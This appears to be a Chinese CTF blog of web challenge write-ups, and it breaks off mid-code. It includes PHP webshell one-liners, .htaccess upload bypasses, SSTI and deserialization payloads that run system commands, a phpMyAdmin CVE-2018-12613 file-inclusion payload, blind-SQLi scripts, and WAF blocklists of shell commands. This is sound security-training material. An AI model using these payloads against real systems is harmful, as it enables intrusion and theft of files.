[GXYCTF2019]BabyUpload\n\n首先尝试上传php文件，被过滤，尝试png图片，过滤，只能上传jpeg了，成功\n\n发现服务器是apache服务器，尝试上传.htaccess文件\n\n```\nAddType application/x-httpd-php .jpeg\n```\n\n成功![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 20.14.17.png)\n\n成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 20.18.24.png)\n\n蚁剑链接即可\n\n## [BUUCTF 2018]Online Tool\n\n上来两个函数escapeshellarg()和escapeshellcmd()\n\n```\nescapeshellarg()将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec(),system()执行运算符。\n```\n\n```\nescapeshellcmd()对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义。反斜线（\\）会在以下字符之前插入：&#;`|*?~<>^()[]{}$,\\x0A和\\xFF。'和\"仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%和!字符都会被空格代替。\n```\n\n两个函数使用的例子\n\n```\n原始输入 172.17.0.2' -v -d a=1\nescapeshellarg处理后 '172.17.0.2''' -v -d a=1'\nescapeshellcmd处理后 '172.17.0.2'\\'' -v -d a=1'\n```\n\n在本题中，使用的nmap有一个名为-oG的参数选项，可以将nmap的命令和执行结果写入文件\n\n```\npayload:?host=' <?php @eval($_POST[\"kkk\"]);?> -oG kkk.php '\n```\n\n传入后变为\n\n```\nnmap -T5 -sT -Pn --host-timeout 2 -F ''<?php @eval($_POST[\"kkk\"]);?> -oG kkk.php''\n```\n\n## [BJDCTF2020]The mystery of ip\n\nSSTI模版注入，以后学了在理解吧\n\n```\nX-Forwarded-For: {{system(\"cat /flag\")}}\n```\n\n\n\n## [RoarCTF 2019]Easy Calc\n\nPHP字符串解析漏洞，查看数据包访问calc.php\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 22.29.28.png)\n\n尝试传入scandir()扫描文件，发现WAF阻挡，将传入参数由num改为 num，php获取到的参数名称为num而WAF获取到 num，绕过WAF成功，扫描发现在根目录下有f1agg文件，使用file_get_content函数读取文件即可\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 22.35.38.png)\n\n\n\n## [网鼎杯 2018]Fakebook\n\n首先注册后进入，发现no疑似存在SQL注入，尝试union select被过滤，尝试union/**/select成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.17.59.png)\n\n爆出回显位置，以及似乎网页对数据库内容进行了反序列化，稍后再看，先进行SQL注入爆出内容\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.19.45.png)\n\n发现用户信息是被序列化后存储在数据库中的，下一步应当尝试查看源码进行反序列化了，访问robots.txt发现了网站源码，源码对用户传入的博客链接进行访问并渲染，直接将链接改为本地文件并渲染，得到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.30.53.png)\n\n## [GXYCTF2019]禁止套娃\n\n首先看robots.txt发现没有内容，扫目录扫出.git，猜测有源码泄露，使用gitHack得到index.php\n\n```php\n//index.php\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n\n```\n\n第一步过滤了所有伪协议，只能执行函数了，下一步查看正则，大佬的解释如下\n\n```\n(?R)是引用当前表达式，(?R)? 这里多一个?表示可以有引用，也可以没有。，引用一次正则则变成了[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\),可以迭代下去，那么它所匹配的就是print(echo(1))、a(b(c()));类似这种可以括号和字符组成的，这其实是无参数RCE比较典型的例子\n```\n\n最终我们就是要构造一个无参嵌套函数执行，首先尝试扫描文件，查看是否有flag文件存在\n\n知识点：localeconv函数返回一包含本地数字及货币格式信息的数组\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.15.48.png)\n\n通过这个函数第一项我们可以拿到.，进而可以使用scandir函数扫描目录文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.17.17.png)\n\n通过current取出第一位.，flag.php在倒数第二的位置，先使用array_reverse函数倒转排序，在使用next取第二位，使用hightlight_file读出文件\n\n```\npayload:?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.19.48.png)\n\n## [GWCTF 2019]我有一个数据库\n\n进去就告诉你数据库是空的，先扫个文件吧，发现有robots.txt和/phpmyadmin/，先看robots，提示去phpinfo.php，就是个phpinfo页面，也没啥提示，看phpmyadmin，数据库里还真没东西\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22 15.25.46.png)\n\n看WP，发现是一个关于phpmyadmin的远程文件包含漏洞[CVE-2018-12613](https://blog.csdn.net/qq_43579362/article/details/108476182)\n\n出现bug的代码位置：phpMyAdmin/index.php\n\n![](https://img-blog.csdnimg.cn/20200908202849454.png)\n\n可以看到传入的target需要满足的条件：\n\n1、是字符串\n\n2、没有index\n\n3、不`target_blacklist`中\n\n4、满足`Core`类中`checkPageValidity`函数检查\n\n最后一个条件的有关代码如下\n\n![](https://img-blog.csdnimg.cn/20200908203030418.png)\n\n上述函数可知，如果想要函数返回真，需要满足以下三个条件的任意一个\n\n1、`$page`变量值在`$white_list`数组中\n\n2、经过`mb_substr()`和`mb_strpos()`处理的`$page–>$_page`的变量值在`$_whitelist`数组中，\n\n3、经过`urldecode(),mb_substr(),mb_strpos()`处理的`$page–>$_page`的变量值在`$_whitelist`数组中，\n\n![](https://img-blog.csdnimg.cn/20200908204934607.png)\n\n开始构造payload，先挑一个在whitelist中的文件db_datadict.php然后加问号和我们想要包含的文件\n\n```\npayload:?target=db_datadict.php%253f/../../../../../../../../../flag\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22 15.45.08.png)\n\n## [网鼎杯 2020 朱雀组]phpweb\n\n打开网站查看源码，发现有一个延时5秒提交的参数，抓包查看参数名称发现可能是执行函数的东西，尝试highlight_file读取页面源码成功\n\n```php+HTML\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n过滤了大部分危险函数，继续看发现有一个Test类在销毁时会执行函数，可通过反序列化绕过函数禁用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23 00.33.29.png)\n\n尝试构造成功，但没有发现flag，搜索一下发现在/tmp/flagoefiu4r93\n\n```\npayload:\nPOST\nfunc=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"tac /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23 00.36.23.png)\n\n## [BSidesCF 2020]Had a bad day\n\n选猫猫或狗狗后url中出现注入点，尝试读取文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-25 23.42.45.png)\n\n似乎会自动补后缀，去掉.php，读取源码\n\n```php+HTML\n<?php\n\t$file = $_GET['category'];\n\tif(isset($file))\n\t{\n\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\"))\n    {\n\t\t\tinclude ($file . '.php');\n\t\t}\n\t\telse{\n\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n\t\t}\n\t}\n?>\n```\n\n包含的条件是参数中有woofers，meowers或者index，任选一个构造payload，再使用过滤器base64编码就可以\n\n```\npayload:?category=php://filter/convert.base64-encode/resource=index/../flag\n```\n\n## [BJDCTF2020]Mark loves cat\n\n啥也没有先扫吧，扫出.git，githack跑一下，看源码\n\n```PHP\n//index.php\n<?php\n\n$flag = file_get_contents('/flag');\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y){\n    $$x = $y;\n}\n\nforeach($_GET as $x => $y){\n    $$x = $$y;\n}\n\nforeach($_GET as $x => $y){\n    if($_GET['flag'] === $x && $x !== 'flag'){\n        exit($handsome);\n    }\n}\n\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\n    exit($yds);\n}\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\n    exit($is);\n}\n\necho \"the flag is: \".$flag;\n```\n\n用第二个判断，$yds=$flag即可\n\n```\npayload:?yds=flag\n```\n\n## [强网杯 2019]高明的黑客\n\n下载源码，3000个文件，打开看内容中有许多eval函数，但是执行时内容不一定可用，编写脚本进行测试\n\n```python\nimport os\nimport requests\nimport re\npath=\"C:\\phpstudy_pro\\WWW\\src\\\\\"\nfiles=os.listdir(path)\nprint(path)\nfor i in files:\n    try:\n        with open(path+i,'r') as f:\n            gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read()))\n            posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read()))\n    except:\n        continue\n    data={}\n    parm={}\n    for j in gets:\n        parm[j]=\"echo 'jlanhere';\"\n    for j in posts:\n        data[j] = \"echo 'jlanhere';\"\n    tex=requests.post(url=f\"http://src/{i}\",data=data,params=parm).text\n    if \"jlanhere\" in tex:\n        tp={}\n        for k in gets:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.get(url=f\"http://src/{i}\",params=tp).text\n            if \"jlanhere\" in textt:\n                print(\"get\")\n                print(i)\n                print(k)\n                exit()\n        for k in posts:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.post(url=f\"http://src/{i}\",data=tp).text\n            if \"jlanhere\" in textt:\n                print(\"post\")\n                print(i)\n                print(k)\n                exit()\n```\n\n找出一个注入点\n\n```\npayload:\nxk0SzyKwfzw.php?Efa5BVG=cat /flag\n```\n\n拿到flag\n\n## [安洵杯 2019]easy_web\n\n看看传参，img的内容是被hex编码后再用两次base64编码得到的，解码内容如下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-26 23.02.28.png)\n\n尝试将index.php编码传入，得到源码\n\n```php+html\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi～ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?>\n```\n\n直接看关键，md5强相等绕过\n\n```\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n或\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n然后就是命令绕过，使用反斜杠绕过cat\n\n```\npayload:?cmd=ca\\t /flag\nPOST:\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n## [BJDCTF2020]Cookie is so stable\n\n直接测试出SSTI，但是这个渲染框架不是flask的，灰溜溜去看wp，发现是php的twig渲染模版，直接在cookie处放payload即可\n\n```\npayload:\nCookie: user={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}}\n```\n\n## [WUSTCTF2020]朴实无华\n\nrobots.txt->fAke_f1agggg.php->fl4g.php\n\n```PHP\n<?php \nheader('Content-type:text/html;charset=utf-8'); \nerror_reporting(0); \nhighlight_file(__file__); \n\n\n//level 1 \nif (isset($_GET['num'])){ \n    $num = $_GET['num']; \n    if(intval($num) < 2020 && intval($num + 1) > 2021){ \n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\"; \n    }else{ \n        die(\"金钱解决不了穷人的本质问题\"); \n    } \n}else{ \n    die(\"去非洲吧\"); \n} \n//level 2 \nif (isset($_GET['md5'])){ \n   $md5=$_GET['md5']; \n   if ($md5==md5($md5)) \n       echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\"; \n   else \n       die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"); \n}else{ \n    die(\"去非洲吧\"); \n} \n\n//get flag \nif (isset($_GET['get_flag'])){ \n    $get_flag = $_GET['get_flag']; \n    if(!strstr($get_flag,\" \")){ \n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); \n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\"; \n        system($get_flag); \n    }else{ \n        die(\"快到非洲了\"); \n    } \n}else{ \n    die(\"去非洲吧\"); \n} \n?> \n```\n\n首先intval函数特性\n\n```\nintval('2e4')=2\nintval('2e4'+1)=20001\n因为在执行下面的命令时相当于先执行了int('2e4')=20000再加一\n所以第一个绕过num=2e4即可\n```\n\n第二个md5弱相等绕过\n\n```\n$md5=md5($md5)\n开头是0e并且md5后也是0e即可\n0e215962017\n```\n\n最后空格绕过和cat绕过\n\n```\npayload:fl4g.php?num=2e4&md5=0e215962017&get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n```\n\n## [护网杯 2018]easy_tornado\n\n进去三个文件\n\n```\n/flag.txt：flag in /fllllllllllllag\n/welcome.txt：render\n/hints.txt：md5(cookie_secret+md5(filename))\n```\n\n点击文件查看链接传参，很明显是文件名和对应的`md5(cookie_secret+md5(filename))`所以我们需要找到`cookie_secret`这一变量的值，再看welcome中有render，怀疑是SSTI，更改传参内容，出现error页面，测试SSTI成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28 22.29.11.png)\n\n在查找tornado获取环境变量在handler.settings中，直接构造\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28 22.31.47.png)\n\n在按照hints中内容构造hash即可\n\n```\npayload:file?filename=/fllllllllllllag&filehash=da1ca88f71d944d0819a420a222fc69c\n```\n\n## [MRCTF2020]你传你🐎呢\n\nApache解析漏洞\n\n```\n#.htaccess\n<FilesMatch \"shell.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n上传后蚁剑连接即可\n\n## [BJDCTF2020]ZJCTF，不过如此\n\n先看代码\n\n```php\n//index.php\n<?php\nerror_reporting(0);\n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"I have a dream\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        die(\"Not now!\");\n    }\n    include($file);  //next.php\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n构造先读取next.php中的内容\n\n```\n?file=php://filter/read=convert.base64-encode/resource=next.php&text=php://input\nPOST:\nI have a dream\n```\n\n```php\n//next.php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n\t@eval($_GET['cmd']);\n}\n\n```\n\n这时候要用一个正则的漏洞[Preg_Replace代码执行漏洞解析](https://www.cesafe.com/html/6999.html)\n\n构造出正则内容为\n\nre=\\S*（多次匹配非空字符）\n\nstr=${phpinfo()}\n\n测试成功\n\n进而使用getFlag函数执行命令\n\n```\npayload:next.php?\\S*={${getFlag()}}&cmd=system('cat /flag');\n```\n\n## [De1CTF 2019]SSRF Me\n\n上来就是代码\n\n```python\n#! /usr/bin/env python\n# #encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if (not os.path.exists(self.sandbox)):\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta', methods=['GET', 'POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if (waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n\n@app.route('/')\ndef index():\n    return open(\"code.txt\", \"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check = param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0', port=9999)\n\n\n```\n\n看代码关键点就是`Task`类中的函数执行，分析得出只要`action`中同时含有scan和read即可读取出文件并返回，而在`De1ta`路径中有创建`Task`类的过程，`geneSign`路径中可以获取sign值，所以让`action=scanread&parma=flag.txt`，通过`geneSign`路径获取sign即可，`getSign`函数中md5内容的拼接，是`secert_key + param + action`，而对于`geneSign`路径来说，action永远为scan，所以geneSign结果就是`secert_key + param + 'scan'`拼接出带有同时带有scan和read只要让`param=flag.txtread`即可，传入`geneSign`拿到sign值\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-29 15.50.50.png)\n\n最终payload如下\n\n```\npayload:De1ta?param=flag.txt\nCookie: action=readscan;sign=1983e9273c0ae452b67ccecb2fb88ed2;\n```\n\n## [网鼎杯 2020 朱雀组]Nmap\n\n详见该题：[BUUCTF 2018]Online Tool\n\n\n\n## [SWPU2019]Web1\n\n是SQL注入\n\n1、空格过滤\n\n2、注释符过滤\n\n3、[information_schema绕过](https://www.anquanke.com/post/id/193512)\n\n4、无列名注入\n\n第一个用/**/绕过就行\n\n第二个末尾加单引号闭合就行\n\n最后一个使用innodb引擎绕过\n\n条件是MySQL版本>5.5\n\n表名在innodb_table_stats\n\n列名在innodb_table_index\n\nselect table_name from mysql.innodb_table_stats where database_name=database()\n\n首先是测试列数，为22列，回显在2，3位，然后爆表名\n\n```\n-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)from(mysql.innodb_table_stats)where(database_name=database())),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n表名：ads，users\n\n无列名注入\n\n```text\nselect 1,2,3 union select * from admin;\n```\n\n这样的话union select的内容就是前三列的内容\n\n```text\nselect `3` from (select 1,2,3 union select * from admin)a;\n```\n\n或者\n\n```\nselect b from (select 1,2,3 as b union select * from admin)a;\n```\n\n这样就是第三列的内容\n\n```\npayload:-1'/**/union/**/select/**/1,(select/**/group_concat(b)from(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n## [MRCTF2020]Ezpop\n\n```PHP\nWelcome to index.php\n<?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n}\n?>\n```\n\n反序列化不用多说，最后应该文件包含加PHP伪协议读取，找链子\n\n`__invoke`需要以函数调用类，在Test的`__get`方法中，`__get`方法在Show中`__toString`调用类中不存在的方法时会被调用，最终构造出的就是\n\n```PHP\n<?php\nclass Modifier{\n    protected $var = 'php://filter/read=convert.base64-encode/resource=flag.php';\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;\n    }\n    public function __toString(){\n        return \"output anything you want\";\n    }\n}\nclass Test{\n    public $p;\n}\n$payload = new Show('test');\n$payload->str = new Test();\n$payload->str->p = new Modifier();\n$hack = new Show($payload);\necho urlencode(serialize($hack));\n?>\n```\n\n内容base64解码即可\n\n## [NPUCTF2020]ReadlezPHP\n\n查看源代码，发现了时间显示所使用的./time.php?source\n\n```PHP\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n?>\n```\n\n反序列化构造出以b为函数名，以a为参数的函数执行即可，尝试system发现没有回显，可能是被过滤，再尝试eval，也被过滤，放弃执行系统命令，尝试执行php函数，使用assert包裹phpinfo()，查找flag成功\n\n## [CISCN2019 华东南赛区]Web11\n\n在XFF位置尝试SSTI成功，输入{{config}}报错发现使用的是smarty渲染，{system('ls /')}发现flag，{system('cp /flag /var/www/html/flag.txt')}将文件带出即可\n\n## [极客大挑战 2019]FinalSQL\n\n点提示发现注入点，过滤了空格，还是数字型注入，使用布尔盲注\n\n```\n爆库名：\nid=2^(ascii(substr((select(database())),{i},1))={ord(j)})\n正确返回3，错误返回2\n爆表名\nid=2^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))={ord(j)})\n爆列名\nid=2^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))={ord(j)})\n```\n\n最终payload脚本\n\n```python\nimport requests\nurl=\"http://93af0548-22e2-4a84-8fd6-3a78dfdda8f3.node4.buuoj.cn:81/search.php\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'id':f\"2^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Ohhh You find the flag read on!\" in tex:\n            print(j,end='')\n            break\n```\n\n## [0CTF 2016]piapiapia\n\n没啥内容先扫目录，www.zip扫出源码，发现有隐藏的注册页面，先进行注册和登录，然后再查看源码\n\n```PHP\nindex.php和register.php一个登录一个注册\nclass.php关键函数\npublic function filter($string) {\n\t$escape = array('\\'', '\\\\\\\\');\n\t$escape = '/' . implode('|', $escape) . '/';\n\t$string = preg_replace($escape, '_', $string);\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t$safe = '/' . implode('|', $safe) . '/i';\n\treturn preg_replace($safe, 'hacker', $string);\n}\nupdate.php更新个人信息内容\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\t$username = $_SESSION['username'];\n\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\tdie('Invalid 